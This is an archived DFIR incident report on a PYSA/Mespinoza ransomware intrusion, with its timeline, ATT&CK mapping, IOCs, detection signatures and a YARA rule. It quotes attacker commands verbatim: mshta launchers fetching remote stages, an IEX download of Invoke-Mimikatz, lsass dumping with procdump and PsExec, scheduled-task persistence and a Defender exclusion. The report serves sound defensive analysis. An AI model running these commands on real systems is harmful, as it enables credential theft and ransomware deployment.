{
    "id": "e220086b-571c-48f4-9de3-6a8dab0b50d9",
    "created_at": "2023-01-12T15:05:31.71475Z",
    "updated_at": "2025-03-27T02:05:54.403097Z",
    "deleted_at": null,
    "sha1_hash": "3b2ae88772c0725e14a8602bd5b5008745685337",
    "title": "2020-11-23 - PYSA-Mespinoza Ransomware",
    "authors": "",
    "file_creation_date": "2022-05-28T18:02:45Z",
    "file_modification_date": "2022-05-28T18:02:45Z",
    "file_size": 1178622,
    "plain_text": "# PYSA/Mespinoza Ransomware\n\n**[thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/](https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/)**\n\n### Intro\n\n\nNovember 23, 2020\n\n\nOver the course of 8 hours the PYSA/Mespinoza threat actors used Empire and Koadic as\nwell as RDP to move laterally throughout the environment, grabbing credentials from as\nmany systems as possible on the way to their objective. The threat actors took their time,\n\n\n-----\n\nlooking for files and reviewing the backup server before executing ransomware on all\nsystems. Hours after being ransomed, our files were opened from multiple Tor exit nodes,\nwhich confirms our suspicion that files had been exfiltrated.\n\n[PYSA/Mespinoza seemed to make its big splash when CERT-FR published a report on](https://www.cert.ssi.gouv.fr/uploads/CERTFR-2020-CTI-003.pdf)\nintrusions back in March 2020. This group has been in business going back as far as 2018\nbut recently the group seems to be picking up pace as one of the up and coming big game\nhunters as noted in Intel 471’s recent [report.](https://public.intel471.com/blog/ransomware-as-a-service-2020-ryuk-maze-revil-egregor-doppelpaymer/)\n\n### Case Summary\n\nIn this intrusion the entry was a Windows host with RDP exposed to the internet. The threat\nactors logged in with a valid account (Domain Administrator). The login was from a Tor exit\nnode and over the course of an 8 hour intrusion we saw them hand off 2 times, for a total of\n3 different Tor exits being used to maintain RDP access to the environment.\n\nThe account used to access the first beachhead host had enough privileges to immediately\nbegin lateral movement to a domain controller just minutes after entry. Network scanning\nbegun on the domain controller followed closely by Empire. While the Empire C2 remained\nactive during the whole intrusion, we saw little activity from it, more like a fallback channel\nshould their RDP access fall off.\n\nAs they started to move laterally to other systems, it was very obvious they were following a\nchecklist playbook. Each time they pivoted, they would check quser, and then dump lsass\nusing Task Manager.\n\nDuring the intrusion we saw the PYSA threat actors attempt to access credentials via the\nfollowing techniques::\n\nDump lsass with Taskmanager\nDump lsass with Procdump\nDump lsass with comsvcs.dll\nDump credentials with Invoke-Mimikatz\nExtract the shadow copy of the ntds.dit from the domain controller\nExtract and decode backup system credentials from a SQL database\nAccess LSA Secrets\n\nMost lateral movement in the environment was via RDP with various legitimate user\naccounts, as well as PsExec to execute scripts throughout the environment for credential\ndumping and collection activity.\n\nThe threat actor disabled security tools throughout the intrusion by using Local Security\nPolicy Editor and MpPreference to disable Defender. PowerShell Remoting was also used to\nrun the arp command on a few systems.\n\n\n-----\n\nBesides using RDP and Empire the group also used the Offensive Security Tool (OST)\n[Koadic, which bills itself as a post exploitation toolkit that can stay resident in memory using](https://github.com/zerosum0x0/koadic)\nJScript or VBS via Windows Script Host to perform its execution. Koadic was only utilized on\na few key servers and one of those servers included a persistence mechanism using the\ndefault Koadic HTA scheduled task module.\n\nAfter around 7 hours post initial access, the threat actors began their final actions by RDPing\ninto systems, dropping a PowerShell script and the ransomware executable. The PowerShell\nscript killed various active processes and made sure RDP was open at the firewall and\ncreated what appears to be a potentially unique identifier for systems. After that, the ransom\nwould be run to encrypt the system.\n\nAfter the encryption was done we were able to confirm exfiltration occurring by receiving a\ncallback from a canary document. The threat actors asked for 5 BTC or around $88,000 USD\nwhich tells us these attackers most likely base their ransom demand on the information\nexfiltrated.\n\n### Timeline\n\n\n-----\n\n-----\n\n### MITRE ATT&CK\n\n Initial Access\n\nInitial access for this actor was via exposed RDP services. Originally, the actor connected\nfrom 198.96.155.3, and then performed a kind of hand off over the course of the campaign,\nfirst to 23.129.64.190 and then finally 185.220.100.240. All 3 of these IP’s belong to the Tor\nnetwork and function as exit nodes.\n\n### Execution\n\nThe threat actors started off by using RDP but also relied on 2 different OSTs during this\nintrusion.\n\nA few minutes after gaining access, they moved laterally to a domain controller and then\n[executed a PowerShell launcher for Empire.](https://www.powershellempire.com/)\n\n\n-----\n\n[Later during the intrusion, the threat actors employed another OST named Koadic. To](https://github.com/zerosum0x0/koadic)\nexecute Koadic, they employed a MSHTA launcher with javascript.\n```\nmshta http://45.147.231.210:9999/8k6Mq\nmshta http://45.147.231.210:9999/VtgyT\n\n```\nFrom those two executions, various child processes were created to load stage 2 into\nmemory.\n\n### Persistence\n\nPersistence was setup using Koadic to schedule a task to execute a HTA file located in the\nC:\\ProgramData directory at logon as system. This will initiate C2 back to the Koadic server.\n```\nschtasks /create /tn K0adic /tr \"C:\\Windows\\system32\\mshta.exe\nC:\\ProgramData\\SZWXNUHHDP.hta\" /sc onlogon /ru System /f\n\n```\n\n-----\n\n### Defense Evasion\n\nThe threat actors disabled Windows Defender using Local Group Policy Editor.\n\nLater, they also ran a PowerShell script that would again disable Windows Defender, this\ntime using MpPreference. The script also targeted Malwarebytes, agents, Citrix, Exchange,\nVeeam, SQL and many other processes. Event ID 5001 was created due to Defender AV\nReal-Time being disabled.\n\nA Defender exclusion was also added to exclude everything with .exe as the extension.\n\n\n-----\n\n```\nAdd MpPreference ExclusionExtension .exe \nEvent ID 5007\nWindows Defender Antivirus Configuration has changed. If this is an unexpected event\nyou should review the settings as this may be the result of malware.\nOld value: \nNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions\\.exe = 0x0\n\n### Credential Access\n\n```\nThe threat actors displayed multiple techniques for gathering credentials during this intrusion.\n\nCredentials were dumped manually via Task Manager as they RDPed into each system.\n\nWhile established on a domain controller the threat actors also created and accessed a\nshadow copy of the ntds.dit and most likely exfiltrated it via their Koadic C2 channel.\n\nEvent ID 1917 (The shadow copy backup for Active Directory Domain Services was\nsuccessful) was logged to the Directory Service event log on the domain controller.\n\nThe threat actors also executed a PowerShell script across the environment using PsExec\nthat took advantage of [comsvcs.dll to dump the lsass process and then copy the dump back](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll)\nto their pivot position on a domain controller.\n\n\n-----\n\nThe threat actors tried using the Sysinternals ProcDump method but the executable was not\npresent on the endpoint.\n```\nprocdump.exe -accepteula -ma lsass.exe mem.dmp\n\n```\nThe threat actors were focused on the backup server for quite awhile as they dumped\ncredentials from the 3rd party backup software repository. The first script pulls the hashes out\nof the database and the second decodes the password to plain text. Both scripts were run\nvia PowerShell ISE.\n\nThe threat actors also ran Invoke-Mimikatz from BC-Security on one of the domain\ncontrollers.\n\n\n-----\n\n```\nIEX (New Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/BC\nSECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1\"); InvokeMimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds\n\n```\nWe also saw the threat actors save LSA Secrets to disk using the hashdump_sam module in\nKoadic which runs impacket.\n\n[Inveigh was run on a domain controller.](https://github.com/Kevin-Robertson/Inveigh)\n\n\n-----\n\n### Discovery\n\nThe threat actors leveraged many built-in Windows tools for discovery including the\nfollowing:\n```\nquser.exe\nwhoami.exe /user\nnet.exe group /domain\nnet.exe group \"Domain Users\" /domain\nnltest.exe /dclist:\narp -a\n\n```\nThe arp command was run using PowerShell Remoting.\n\n\n-----\n\nThey also reviewed a few admin tools while exploring the network including:\n```\nmmc.exe C:\\Windows\\system32\\dnsmgmt.msc \nmmc.exe C:\\Windows\\system32\\domain.msc\nmmc.exe C:\\Windows\\system32\\compmgmt.msc /s\nmmc.exe C:\\Windows\\system32\\gpedit.msc\nmmc.exe C:\\Windows\\system32\\diskmgmt.msc \nmmc.exe C:\\Windows\\system32\\wbadmin.msc\nveeam.backup.shell.exe\n\n```\nThe threat actors also brought some tools of their own to aid in discovery tasks including\n[Advanced Port Scanner and](https://www.advanced-port-scanner.com/) [ADRecon.](https://github.com/sense-of-security/ADRecon)\n\nHere’s the description of ADRecon.\n\n\n-----\n\nOther local discovery was performed using PowerShell such as ps to list the running process\non systems.\n\n### Lateral Movement\n\nThe first lateral movement occurred just 3 minutes after the initial access by the threat actor.\nRDP was initiated from the beachhead host to a domain controller using the valid account\nthey had used to gain access to the first host.\n\nRDP continued to be the first method of choice while accessing various systems around the\nenvironment. After a few hours in, the threat actors decided to automate some credential\ncollection and used PsExec to execute a PowerShell script that called comsvcs.dll for lsass\ndumping.\n```\nPsExec.exe -d \\\\HOST -u \"DOMAIN\\USER\" -p \"PASSWORD\" -accepteula -s cmd /c\n\"powershell.exe -ExecutionPolicy Bypass -file \\\\DOMAINCONTROLLER\\share$\\p.ps1\"\n\n### Command and Control\n\n```\n\n-----\n\nThe threat actors used 3 different C2 channels, RDP, PowerShell Empire, and Koadic.\n\nIP’s used to maintain access over RDP\n```\n198.96.155.3\n23.129.64.190\n185.220.100.240\n\n```\n**Empire**\n```\n194.36.190.74:443\nCertificate [b8:20:c2:db:b6:b8:f4:0f:61:a5:c0:27:40:89:e6:30:cd:db:05:5e ]\nNot Before 2020/09/17 18:38:42\nNot After 2021/09/17 18:38:42\nPublic Algorithm rsaEncryption\nJA3: 5e12c14bda47ac941fc4e8e80d0e536f\nJA3s: 0eec924176fb005dfa419c80ab72d27c\n\n```\n**Koadic**\n\n45.147.231.210:9999\n\nC2 Check-in\n\nCommand execution\n\n### Exfiltration\n\nWhile no plain text exfiltration was seen during this intrusion, canary documents were\nopened by the threat actors hours after the ransom, confirming that the hours spent on\nnetwork before ransoming was used to gather files\n\n\n-----\n\nThe source IP s from these canary documents were also Tor exit nodes just like the RDP\nconnections.\n\nSince no plaintext exfil was observed we assess that the exfiltration was performed via one\nof the command and control channels either RDP, Empire, or Koadic.\n\n### Impact\n\nAround the 7.5 hour mark the threat actors began ransom deployment. Two files were\ndropped via RDP on each system, a PowerShell script and a PYSA ransomware executable.\n```\nC:\\Users\\USER\\Downloads\\svchost.exe\nC:\\Users\\USER\\Downloads\\p.ps1\n\n```\nThe purpose of the PowerShell script was to disable security tools that might not have been\ndisabled through-out the intrusion.\n\nAdditionally, the script would kill many server and database processes allowing encryption of\nthe files that might otherwise be locked by running processes.\n\nFinally, the ransomware exe was executed and the systems ransomed.\n\n\n-----\n\n[Enjoy our report? Please consider donating $1 or more to the project using Patreon. Thank](https://www.patreon.com/thedfirreport)\nyou for your support!\n\n[We also have pcaps, files, memory images, and Kape packages available here.](https://thedfirreport.com/services/)\n\n## IOCs\n\nMISP Priv [https://misppriv.circl.lu/events/view/81105](https://misppriv.circl.lu/events/view/81105)\n\nOTX [https://otx.alienvault.com/pulse/5fbb23c7dfc6aa0ffd92d27f](https://otx.alienvault.com/pulse/5fbb23c7dfc6aa0ffd92d27f)\n\n### Network\n```\n198.96.155.3\n23.129.64.190\n185.220.100.240\nhttp://45.147.231.210:9999/8k6Mq\nhttp://45.147.231.210:9999/VtgyT\n45.147.231.210\n194.36.190.74\nhttps://194.36.190.74\n\n File\n\n```\n\n-----\n\n```\nsvchost.exe\nbd395971a7eb344673de513a15c16098\n1db448b0f1adf39874d6ea6b245b9623849f48e5\ndf0cd6a8a67385ba67f9017a78d6582db422a137160176c2c5c3640b482b4a6c\np.ps1\n2df8d3581274a364c6bf8859c9bdc034\n8af4bfcef0f3fefae3f33b86815a6f940b64f4b7\neb1d0acd250d32e16fbfb04204501211ba2a80e34b7ec6260440b7d563410def\np.ps1\n1da1f49900268fa7d783feda8849e496\n72f2352eab5cb0357bdf5950c1d0374a19cfdf99\n0ab8f14e2c1e6f7c4dfa3d697d935d4fbef3605e15fd0d489d39b7f82c84ba7e\nXEKFGUIQQB.hta\n5266daf58dd34076e447474c7dce09b2\nb0197a53a56939d3d9006df448bc46ef599bac31\n81e0d5945ab7374caf2353f8d019873c88728a6c289884a723321b8a21df3c77\n\n## Detections\n\n### Network\nETPRO TROJAN Win32/Koadic CnC Checkin\nETPRO TROJAN Koadic Command Execution via CnC\nET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection\nET POLICY Outbound MSSQL Connection to Non-Standard Port - Likely Malware\nET SCAN NMAP SIP Version Detect OPTIONS Scan\nET MALWARE Possible Metasploit Payload Common Construct Bind_API (from server)\nGPL SNMP public access udp\nET SCAN Behavioral Unusual Port 139 traffic Potential Scan or Infection\nET SCAN Behavioral Unusual Port 135 traffic Potential Scan or Infection\nET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection\nET SCAN Potential SSH Scan OUTBOUND\n\n Sigma\n\n```\n[win_hack_koadic](https://github.com/Neo23x0/sigma/blob/de5444a81e770ec730aa5e3af69781ab222f021a/rules/windows/process_creation/win_hack_koadic.yml)\n\n[win_mshta_spawn_shell](https://github.com/Neo23x0/sigma/blob/de5444a81e770ec730aa5e3af69781ab222f021a/rules/windows/process_creation/win_mshta_spawn_shell.yml)\n\n[win_susp_whoami](https://github.com/Neo23x0/sigma/blob/cf22e9e576e8bfd92e74693dc53fe101b9bb0af1/rules/windows/process_creation/win_susp_whoami.yml)\n\n[win_local_system_owner_account_discovery](https://github.com/Neo23x0/sigma/blob/de5444a81e770ec730aa5e3af69781ab222f021a/rules/windows/process_creation/win_local_system_owner_account_discovery.yml)\n\n[win_susp_schtask_creation](https://github.com/Neo23x0/sigma/blob/de5444a81e770ec730aa5e3af69781ab222f021a/rules/windows/process_creation/win_susp_schtask_creation.yml)\n\n[win_susp_powershell_empire_launch](https://github.com/Neo23x0/sigma/blob/de5444a81e770ec730aa5e3af69781ab222f021a/rules/windows/process_creation/win_susp_powershell_empire_launch.yml)\n\n[sysmon_susp_vssadmin_ntds_activity](https://github.com/Neo23x0/sigma/blob/92c0e0321a25d724a75e0654a1474aaa5f870342/rules/windows/sysmon/sysmon_susp_vssadmin_ntds_activity.yml)\n\n### Yara\n\n\n-----\n\n```\n/\nYARA Rule Set\nAuthor: The DFIR Report\nDate: 2020-11-16\nIdentifier: Case 1010\nReference: https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/\n*/\n/* Rule Set ----------------------------------------------------------------- */\nimport \"pe\"\nrule mespinoza_svchost {\nmeta:\ndescription = \"files - svchost.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2020-11-16\"\nhash1 = \"df0cd6a8a67385ba67f9017a78d6582db422a137160176c2c5c3640b482b4a6c\"\nstrings:\n$s1 = \"[email protected]\n[email protected]@@[email protected]@[email protected]@VPK_EncryptionMessageEncoding\"\nascii\n$s2 = \"protonmail.com\" fullword ascii\n$s4 = \"update.bat\" fullword ascii\n$s5 = \"[email protected][email protected]\n[email protected]@[email protected]@@@[email protected]@[email protected]@@CryptoP\"\nascii\n$s6 = \"[email protected][email protected]@@[email protected][email protected]\n[email protected]@[email protected]\" ascii\n$s7 = \"[email protected][email protected]@@[email protected]\n[email protected]@[email protected]@[email protected]@[email protected]@VP\" ascii\n$s8 = \"[email protected][email protected]@@[email protected]\n[email protected]@[email protected]@[email protected]@[email protected]@VP1363\" ascii\n$s9 = \"[email protected][email protected]\n[email protected]@[email protected]@[email protected]@[email protected]@[email protec\nted]@@[email protected]@[email protected]@UR\" ascii\n$s10 = \"[email protected][email protected][email protected]@[email protected]@V?\n$OA[email protected]@[email protected]@[email protected]@@[email protected]@[email pr\notected]@UR\" ascii\n$s11 = \"[email protected][email protected]@@[email protected]\n[email protected]@[email protected]@[email protected]@[email protected]@VP\" ascii\n$s12 = \"[email protected]\n[email protected]@@[email protected]@[email protected]@[email protected]@[email prote\ncted]@[email protected]@@[email protected]@[email protected]@[email protected]@\"\nascii\n$s13 = \"[email protected][email protected]@@[email protected]\n[email protected]@[email protected]@[email protected]@[email protected]@VP1363\" ascii\n$s14 = \"Check out our website, we just posted there new updates for our partners:\"\nfullword ascii\n$s15 = \"Also, be aware that we downloaded files from your servers and in case of nonpayment we will be forced to upload them on our web\" ascii\n$s16 =\n\"E3AF7F517600CD3B9006519EA9E24F65CE0318C3F326A20C1C73F644F32C4CDCEE7A398153C29C4B844A7\n ascii\n\n```\n\n-----\n\n```\n$s17 \n\"30820220300D06092A864886F70D01010105000382020D003082020802820201009A673A7A8FD521FAE7C\n ascii\n$s18 =\n\"A76229D9DAD792BF87826DBE0FFED40E7CEE781DF4E8B4AF086E21D41CE0912DAC6252A512B4C81F98E46\n ascii\n$s19 =\n\"CE012C93EC57B77DB5D9D4C345E7F3A2564C09E728C8B88CCD6A824C070EDDA34DA7082665B0732783868\n ascii\n$s20 = \": ;+;6;?;E;\" fullword ascii /* hex encoded string 'n' */\ncondition:\nuint16(0) == 0x5a4d and filesize < 2000KB and\n( pe.imphash() == \"b5e8bd2552848bb7bf2f28228d014742\" or 8 of them )\n}\n\n## MITRE\n\n```\nExternal Remote Services – T1133\n\nValid Accounts – T1078\n\nGraphical User Interface – T1061\n\nMshta – T1218.005\n\nPowerShell – T1059.001\n\nLocal Account – T1087.001\n\nRemote System Discovery – T1018\n\nFile and Directory Discovery – T1083\n\nDomain Trust Discovery – T1482\n\nAccount Discovery – T1087\n\nScheduled Task – T1053.005\n\nLateral Tool Transfer – T1570\n\nSMB/Windows Admin Shares – T1021.002\n\nRemote Desktop Protocol – T1021.001\n\nCredential Dumping – T1003\n\nLSASS Memory – T1003.001\n\nProcess Discovery – T1057\n\nStandard Application Layer Protocol – T1071\n\nExfiltration Over C2 Channel – T1041\n\nData Encrypted for Impact – T1486\n\nRundll32 – T1218.011\n\nInternal case 1010\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-23 - PYSA-Mespinoza Ransomware.pdf"
    ],
    "report_names": [
        "2020-11-23 - PYSA-Mespinoza Ransomware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535931,
    "ts_updated_at": 1743041154,
    "ts_creation_date": 1653760965,
    "ts_modification_date": 1653760965,
    "files": {
        "pdf": "https://archive.orkl.eu/3b2ae88772c0725e14a8602bd5b5008745685337.pdf",
        "text": "https://archive.orkl.eu/3b2ae88772c0725e14a8602bd5b5008745685337.txt",
        "img": "https://archive.orkl.eu/3b2ae88772c0725e14a8602bd5b5008745685337.jpg"
    }
}